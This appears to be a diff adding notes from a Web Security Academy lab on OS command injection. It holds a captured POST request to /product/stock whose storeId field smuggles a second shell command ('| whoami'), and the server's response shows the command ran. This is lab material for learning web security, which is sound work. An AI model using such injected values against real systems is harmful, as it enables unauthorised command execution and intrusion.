@@ -1,0 +1,19 @@
+Request
+POST /product/stock HTTP/2
+Host: <lab-host>.web-security-academy.net
+Cookie: session=<redacted>
+...
+Referer: <lab-host>.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+productId=1&storeId=1 | whoami
+
+
+Response
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 13
+
+peter-cN8uvv
